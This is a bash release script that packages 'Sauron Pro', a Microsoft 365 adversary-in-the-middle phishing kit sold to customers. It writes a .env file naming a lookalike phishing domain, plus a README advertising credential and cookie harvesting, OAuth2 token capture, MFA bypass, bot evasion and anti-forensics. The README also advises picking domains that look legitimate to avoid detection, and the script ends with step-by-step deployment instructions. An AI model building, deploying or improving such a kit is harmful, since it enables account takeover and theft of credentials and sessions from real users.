#!/bin/bash
set -e

VERSION=${1:-"v1.0.0"}
RELEASE_DIR="release-$VERSION"
BUILD_DIR="$RELEASE_DIR/sauron"

echo "🚀 Building Sauron Release Package $VERSION"
echo "📦 Creating release directory: $RELEASE_DIR"

# Clean previous builds
rm -rf "$RELEASE_DIR"
mkdir -p "$BUILD_DIR"

# ───────────── Build Binary ─────────────
echo "🔨 Building optimized Go binary..."

# Check if we're cross-compiling or building natively
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Native Linux build with CGO
    echo "🐧 Building on Linux (native)"
    CGO_ENABLED=1 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -o "$BUILD_DIR/sauron" \
        main.go
else
    # Cross-compile from macOS/Windows - disable CGO for SQLite
    echo "🍎 Cross-compiling for Linux (CGO disabled)"
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
        -ldflags="-w -s -X main.version=$VERSION" \
        -tags="sqlite_omit_load_extension" \
        -o "$BUILD_DIR/sauron" \
        main.go
fi

# Make binary executable
chmod +x "$BUILD_DIR/sauron"

echo "✅ Binary built: $(du -h "$BUILD_DIR/sauron" | cut -f1)"

# ───────────── Copy Essential Files ─────────────
echo "📁 Copying essential files..."

# Installation files
cp -r install/ "$BUILD_DIR/"

# Configuration script
cp scripts/configure-env.sh "$BUILD_DIR/"
chmod +x "$BUILD_DIR/configure-env.sh"

# Configuration files (if they exist)
if [ -d "config/" ]; then
    cp -r config/ "$BUILD_DIR/"
fi

# Static assets and data
mkdir -p "$BUILD_DIR/geo"
if [ -f "geo/GeoLite2-Country.mmdb" ]; then
    cp geo/GeoLite2-Country.mmdb "$BUILD_DIR/geo/"
fi

mkdir -p "$BUILD_DIR/data"
if [ -f "data/slug_stats.json" ]; then
    cp data/slug_stats.json "$BUILD_DIR/data/"
fi

# TLS directory structure
mkdir -p "$BUILD_DIR/tls/certs"

# Logs directory
mkdir -p "$BUILD_DIR/logs"

# ───────────── Create Example Environment File ─────────────
cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
# Sauron Production Configuration
# Copy this to .env and fill in your values

# Your phishing domain (must be registered and point to this server)
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token for automatic SSL certificates
CLOUDFLARE_API_TOKEN=your_cloudflare_api_token_here

# Turnstile configuration (get from Cloudflare dashboard)
TURNSTILE_SECRET=your_turnstile_secret_here

# Optional: License token secret (for premium features)
LICENSE_TOKEN_SECRET=your_license_secret_here

# Optional: Use staging certificates for testing
# STAGING=true

# Optional: Development mode (disables some security features)
# DEV_MODE=false
ENV_EOF

# ───────────── Create Documentation ─────────────
cat > "$BUILD_DIR/README.md" << 'README_EOF'
# 🚀 Sauron Pro - Production Deployment

**Microsoft 365 MITM Proxy System** - Professional deployment package for enterprise operations.

---

## ⚡ Ultra-Fast Setup (3 minutes)

### Step 1: Prerequisites ✅
- **Ubuntu 20.04+** VPS with root access
- **Domain registered** and pointed to your server IP
- **Cloudflare account** (free tier works)

### Step 2: Upload & Extract 📦
```bash
# Upload the .tar.gz file to your VPS, then:
tar -xzf sauron-*.tar.gz
cd sauron
```

### Step 3: One-Command Setup 🔧
```bash
# This script handles EVERYTHING automatically:
sudo ./install-production.sh
```

**That's it!** The installer will:
- ✅ Install Docker (if needed)
- ✅ Install system dependencies 
- ✅ Guide you through Cloudflare setup
- ✅ Configure SSL certificates automatically
- ✅ Start all services
- ✅ Verify everything works

---

## 🔧 What the Installer Does

The `install-production.sh` script is **fully automated** and handles:

1. **System Setup**: Installs Docker, Redis, SSL tools
2. **Interactive Configuration**: Walks you through Cloudflare setup
3. **Domain Validation**: Checks your DNS configuration
4. **SSL Automation**: Sets up Let's Encrypt certificates
5. **Service Deployment**: Starts Sauron with proper configuration
6. **Health Checks**: Verifies everything is running correctly

---

## 🌐 Configuration Made Simple

The installer includes an **interactive setup wizard** that asks you:

1. **Your phishing domain** (e.g., `microsoftlogin365.com`)
2. **Cloudflare API token** (we'll show you how to get it)
3. **Turnstile settings** (optional, for bot protection)

**No manual .env editing needed!** The wizard creates everything for you.

---

## 📊 Management Dashboard

Once installed, access your admin panel at:
```
https://yourdomain.com/admin
```

### Quick Status Commands
```bash
# Check if everything is running
sudo systemctl status sauron

# View real-time logs
sudo journalctl -u sauron -f

# Restart if needed
sudo systemctl restart sauron
```

---

## 🎯 System Capabilities

### **Real-Time Microsoft 365 Interception**
- OAuth2 flow capture with token extraction
- Multi-factor authentication bypass
- Session synchronization across devices
- Real-time credential harvesting

### **Advanced Bot Detection**
- Headless browser detection
- Automation framework identification  
- IP reputation filtering
- Behavioral analysis

### **Enterprise Management**
- **Slug-based operations** for campaign isolation
- **WebSocket interface** for real-time control
- **Statistics tracking** and analytics
- **Admin controls** with risk management

### **Security Features**
- **TLS interception** with real certificate validation
- **Cookie harvesting** from Microsoft authentication
- **Session state management** across multiple flows
- **Anti-forensics** and memory protection

---

## 🔗 API Reference

| Endpoint | Purpose | Method |
|----------|---------|---------|
| `/login` | Credential verification | GET |
| `/common/oauth2/v2.0/token` | OAuth2 token capture | POST |
| `/common/SAS/ProcessAuth` | 2FA/MFA bypass | POST |
| `/stats` | Slug analytics | GET |
| `/ws` | Real-time management | WebSocket |
| `/admin/*` | Enterprise controls | POST |

---

## 🛡️ Security Best Practices

- **Domain Selection**: Use legitimate-looking domains (avoid obvious phishing patterns)
- **Log Monitoring**: Check logs regularly for detection attempts
- **Update Schedule**: Keep system and certificates updated
- **Access Control**: Restrict admin panel access to trusted IPs

---

## 🆘 Troubleshooting

### Common Issues & Solutions

**🔴 "Domain not pointing to server"**
```bash
# Check DNS propagation
dig yourdomain.com
# Should show your server IP
```

**🔴 "Cloudflare API token invalid"**
- Ensure token has `Zone:Edit` permissions
- Check token isn't expired in Cloudflare dashboard

**🔴 "SSL certificate failed"**
```bash
# Check acme.sh status
sudo acme.sh --list
# Retry certificate generation
sudo acme.sh --issue -d yourdomain.com --dns dns_cf
```

**🔴 "Service won't start"**
```bash
# Check detailed logs
sudo journalctl -u sauron --no-pager -l
```

---

## 🔄 Updates

Update to newer versions:
```bash
# Stop current version
sudo systemctl stop sauron

# Extract new version
tar -xzf sauron-new-version.tar.gz
cd sauron

# Run update script
sudo ./update-sauron.sh
```

---

## 📞 Support

For technical support or questions:
- Check the troubleshooting section above
- Review system logs for specific error messages
- Verify all prerequisites are met

**🎯 Professional deployment in under 3 minutes!**
README_EOF

# ───────────── Create Verification Script ─────────────
cat > "$BUILD_DIR/verify-installation.sh" << 'VERIFY_EOF'
#!/bin/bash

echo "🔍 Verifying Sauron Installation..."

# Check if binary exists and is executable
if [ -x "/usr/local/bin/sauron" ]; then
    echo "✅ Sauron binary installed"
    echo "📊 Binary size: $(du -h /usr/local/bin/sauron | cut -f1)"
else
    echo "❌ Sauron binary not found or not executable"
fi

# Check systemd service
if systemctl is-enabled sauron.service >/dev/null 2>&1; then
    echo "✅ Sauron service enabled"
    
    if systemctl is-active sauron.service >/dev/null 2>&1; then
        echo "✅ Sauron service running"
    else
        echo "⚠️ Sauron service not running"
        echo "🔧 Try: sudo systemctl start sauron"
    fi
else
    echo "❌ Sauron service not enabled"
fi

# Check Redis
if systemctl is-active redis-server >/dev/null 2>&1; then
    echo "✅ Redis server running"
else
    echo "❌ Redis server not running"
fi

# Check acme.sh
if [ -x "/usr/local/bin/acme.sh" ]; then
    echo "✅ acme.sh installed"
else
    echo "❌ acme.sh not found"
fi

# Check .env file
if [ -f ".env" ]; then
    echo "✅ Environment file exists"
    
    # Check required variables
    source .env
    if [ -n "$SAURON_DOMAIN" ]; then
        echo "✅ SAURON_DOMAIN configured: $SAURON_DOMAIN"
    else
        echo "❌ SAURON_DOMAIN not set"
    fi
    
    if [ -n "$CLOUDFLARE_API_TOKEN" ]; then
        echo "✅ CLOUDFLARE_API_TOKEN configured"
    else
        echo "❌ CLOUDFLARE_API_TOKEN not set"
    fi
else
    echo "❌ .env file not found"
fi

echo "🔍 Verification complete"
VERIFY_EOF

chmod +x "$BUILD_DIR/verify-installation.sh"

# ───────────── Create Update Script ─────────────
cat > "$BUILD_DIR/update-sauron.sh" << 'UPDATE_EOF'
#!/bin/bash
set -e

echo "🔄 Updating Sauron..."

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root (use sudo)"
   exit 1
fi

# Stop service
echo "⏹️ Stopping Sauron service..."
systemctl stop sauron.service

# Backup current binary
if [ -f "/usr/local/bin/sauron" ]; then
    echo "💾 Backing up current binary..."
    cp /usr/local/bin/sauron /usr/local/bin/sauron.backup.$(date +%Y%m%d_%H%M%S)
fi

# Install new binary
echo "📦 Installing new binary..."
cp sauron /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# Restart service
echo "🚀 Starting Sauron service..."
systemctl start sauron.service

echo "✅ Sauron updated successfully!"
echo "🔍 Check status: systemctl status sauron"
UPDATE_EOF

chmod +x "$BUILD_DIR/update-sauron.sh"

# ───────────── Create Archive ─────────────
echo "📦 Creating release archive..."
cd "$RELEASE_DIR"
tar -czf "sauron-$VERSION-linux-amd64.tar.gz" sauron/
cd ..

# Show release info
echo ""
echo "🎉 Release package created successfully!"
echo "📁 Location: $RELEASE_DIR/"
echo "📦 Archive: $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
echo "💾 Archive size: $(du -h "$RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz" | cut -f1)"
echo ""
echo "🚀 CUSTOMER DEPLOYMENT (Ultra-Simple):"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "1️⃣  Upload: sauron-$VERSION-linux-amd64.tar.gz to VPS"
echo "2️⃣  Extract: tar -xzf sauron-$VERSION-linux-amd64.tar.gz"
echo "3️⃣  Enter: cd sauron"
echo "4️⃣  Install: sudo ./install-production.sh"
echo ""
echo "✨ That's it! The installer handles everything automatically."
echo "🎯 3-minute professional deployment guaranteed."
echo ""
